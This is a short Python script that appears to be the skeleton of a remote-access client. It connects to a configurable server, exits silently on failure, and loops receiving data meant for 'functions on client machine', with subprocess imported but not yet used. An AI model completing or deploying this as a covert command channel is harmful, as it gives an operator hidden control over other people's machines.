import os
import subprocess 
import socket 

path = os.path.dirname(os.path.abspath(__file__))

# These are relevant to wherever you are going to host the server, IP is defined here before execution/build
host = '127.0.0.1'
port = 55885 # don't have to change it even if it is on a different port

s = socket.socket()
try:
  s.connect((host,port))
except:
  os._exit(0)

while True:
  try:
    # functions on client machine
    data = s.recv(1024) # data sent from server: buffer 1024 bytes
    # data[:].decode('utf-8') => if strings are sent, change data to a string w/ utf-8 encoding 
  except:
    # close on error
    os._exit(0)
